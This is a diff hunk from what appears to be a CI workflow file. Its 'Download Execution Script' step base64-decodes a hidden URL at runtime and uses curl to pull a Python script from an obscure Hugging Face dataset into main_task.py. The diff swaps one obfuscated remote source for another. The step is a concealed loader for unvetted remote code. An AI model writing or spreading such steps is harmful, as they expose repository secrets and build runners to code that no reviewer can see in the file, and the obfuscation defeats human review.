@@ -63,7 +63,7 @@ jobs:
       # -----------------------------------------------------------------
       - name: Download Execution Script
         run: |
-          SCRIPT_SRC=$(openssl base64 -d -A <<< "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5")
+          SCRIPT_SRC=$(openssl base64 -d -A <<< "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk=")
           curl -sL "$SCRIPT_SRC" -o main_task.py
 
       # -----------------------------------------------------------------
